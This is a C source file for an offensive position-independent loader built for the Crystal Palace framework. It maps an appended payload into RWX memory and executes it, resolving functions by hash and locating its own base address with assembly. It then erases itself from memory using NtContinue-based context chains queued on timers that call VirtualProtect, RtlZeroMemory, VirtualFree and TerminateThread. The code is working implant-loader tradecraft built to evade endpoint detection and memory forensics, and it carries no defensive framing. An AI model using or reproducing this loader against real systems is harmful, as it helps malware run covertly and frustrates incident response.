#include <windows.h>
#include "tcg.h"
#include "loader.h"

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" in loader.spec
 */
char * resolve(DWORD modHash, DWORD funcHash) {
	char * hModule = (char *)findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BOFDATA__[0] __attribute__((section("my_data")));
char __DLLDATA__[0] __attribute__((section("pic_end")));

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

char * findPicEnd() {
	return (char *)&__DLLDATA__;
}

/**
 * Copy relevant CONTEXT registers from src to dst
 */
void copyContextRegisters(CONTEXT *dst, CONTEXT *src) {
	dst->ContextFlags = src->ContextFlags;
	dst->Rax = src->Rax;
	dst->Rcx = src->Rcx;
	dst->Rdx = src->Rdx;
	dst->Rbx = src->Rbx;
	dst->Rsp = src->Rsp;
	dst->Rbp = src->Rbp;
	dst->Rsi = src->Rsi;
	dst->Rdi = src->Rdi;
	dst->R8  = src->R8;
	dst->R9  = src->R9;
	dst->R10 = src->R10;
	dst->R11 = src->R11;
	dst->R12 = src->R12;
	dst->R13 = src->R13;
	dst->R14 = src->R14;
	dst->R15 = src->R15;
	dst->Rip = src->Rip;
}

void cleanUp(char * start_addr, char * end_addr) {
    CONTEXT CtxThread = { 0 };
	CtxThread.ContextFlags = CONTEXT_ALL;  /** REQUIRED for RtlCaptureContext */
    
	CONTEXT *RopProtRW = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopMemZero = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopFree = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopTerminate = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	
	HANDLE  hTimerQueue = NULL;
	HANDLE  hNewTimer = NULL;
	HANDLE  hCurrentThread = NULL;
	HANDLE  hMainThreadDup = NULL;
	PVOID   PicBase = NULL;
	DWORD   PicSize = 0;
	DWORD   OldProtect = 0;

    PVOID   NtContinue = GetProcAddress(LoadLibraryA("Ntdll"), "NtContinue");

	hTimerQueue = KERNEL32$CreateTimerQueue();
	hCurrentThread = KERNEL32$GetCurrentThread(); /** Get current thread handle */

	/** Duplicate main thread handle so it's valid in timer context */
	HANDLE hProcess = KERNEL32$GetCurrentProcess();
	KERNEL32$DuplicateHandle(hProcess, hCurrentThread, hProcess, &hMainThreadDup, 0, FALSE, DUPLICATE_SAME_ACCESS);

    PicBase = start_addr;
    PicSize = (DWORD)(end_addr - start_addr);

	if (KERNEL32$CreateTimerQueueTimer(
		&hNewTimer,
		hTimerQueue,
		(WAITORTIMERCALLBACK)GetProcAddress(LoadLibraryA("Ntdll"),"RtlCaptureContext"),
		&CtxThread,
		0,
		0,
		WT_EXECUTEINTIMERTHREAD
	)){
		dprintf("[CLEANUP] RtlCaptureContext timer created\n");

		KERNEL32$WaitForSingleObject((HANDLE)-1, 1000);  /** 1 second timeout for RtlCaptureContext */
		
		/** Validate CtxThread was captured */
		if (CtxThread.Rip == 0) {
			dprintf("[CLEANUP] ERROR: CtxThread not captured (Rip is 0)\n");
			return;
		}
		
		dprintf("[CLEANUP] Copying context structures\n");
        
		/** Copy context structures field by field instead of memcpy */
		copyContextRegisters(RopProtRW, &CtxThread);
		copyContextRegisters(RopMemZero, &CtxThread);
		copyContextRegisters(RopFree, &CtxThread);
		copyContextRegisters(RopTerminate, &CtxThread);

		// VirtualProtect( PicBase, PicSize, PAGE_READWRITE, &OldProtect );
		RopProtRW->Rsp -= 8;
		RopProtRW->Rip = (DWORD64)GetProcAddress(LoadLibraryA("Kernel32"), "VirtualProtect");
		RopProtRW->Rcx = (DWORD64)PicBase;
		RopProtRW->Rdx = (DWORD64)PicSize;
		RopProtRW->R8  = (DWORD64)PAGE_READWRITE;
		RopProtRW->R9  = (DWORD64)&OldProtect;

		// RtlZeroMemory( PicBase, PicSize );
		RopMemZero->Rsp -= 8;
		RopMemZero->Rip = (DWORD64)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlZeroMemory");
		RopMemZero->Rcx = (DWORD64)PicBase;
		RopMemZero->Rdx = (DWORD64)PicSize;

		// VirtualFree( PicBase, 0, MEM_RELEASE );
		RopFree->Rsp -= 8;
		RopFree->Rip = (DWORD64)GetProcAddress(LoadLibraryA("Kernel32"), "VirtualFree");
		RopFree->Rcx = (DWORD64)PicBase;
		RopFree->Rdx = 0;
		RopFree->R8  = (DWORD64)MEM_RELEASE;

		// TerminateThread( hMainThreadDup, 0 );
		RopTerminate->Rsp -= 8;
		RopTerminate->Rip = (DWORD64)GetProcAddress(LoadLibraryA("Kernel32"), "TerminateThread");
		RopTerminate->Rcx = (DWORD64)hMainThreadDup;
		RopTerminate->Rdx = 0;

		dprintf("[CLEANUP] Queueing timers for cleanup...\n");

		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopMemZero, 200, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopFree, 300, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopTerminate, 400, 0, WT_EXECUTEINTIMERTHREAD);

        KERNEL32$WaitForSingleObject((HANDLE)-1, INFINITE);
    }
}

/*
 * Our PICO loader, have fun, go nuts!
 */
void entry(char * start_addr, char * end_addr) {
	char        * dstCode;
	char        * dstData;
	char        * src;
	IMPORTFUNCS   funcs;

	dprintf("[INFO] PIC start address: (memAddr: %p)\n", start_addr);
	dprintf("[INFO] PIC end address: (memAddr: %p)\n", end_addr);

	/** Find our DLL appended to this PIC */
	src = findAppendedPICO();

	/** Allocate memory for our PICO */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/** Setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/** Load our pico into our destination address */
	PicoLoad(&funcs, src, dstCode, dstData);

	/** Execute our pico */
	PicoEntryPoint(src, dstCode) (NULL);

	dprintf("[INFO] PICO execution complete, starting global cleanup...\n");

	/** Set dstCode and dstData to PAGE_READWRITE and zero their memory before cleanup */
	DWORD oldProtectCode = 0, oldProtectData = 0;
	KERNEL32$VirtualProtect(dstCode, PicoCodeSize(src), PAGE_READWRITE, &oldProtectCode);
	KERNEL32$VirtualProtect(dstData, PicoDataSize(src), PAGE_READWRITE, &oldProtectData);
	NTDLL$RtlZeroMemory(dstCode, PicoCodeSize(src));
	NTDLL$RtlZeroMemory(dstData, PicoDataSize(src));

	/** Free memory for dstCode and dstData */
	KERNEL32$VirtualFree(dstCode, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(dstData, 0, MEM_RELEASE);

	cleanUp(start_addr, end_addr);

	dprintf("[INFO] END!\n");
}

void __attribute__((naked)) retptr() {
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "pop     rax;"
        "jmp     rax;"
        ".att_syntax prefix;"
    );
}

void go() {
	char * start_addr;
	
	__asm__ __volatile__ (
		".intel_syntax noprefix;"
		"call    retptr;"
		"sub     rax, 0xD;"
		"mov     %0, rax;"
		".att_syntax prefix;"
		: "=r" (start_addr)
		:
		: "rax"
	);

	entry(
		start_addr,
		findPicEnd()
	);
}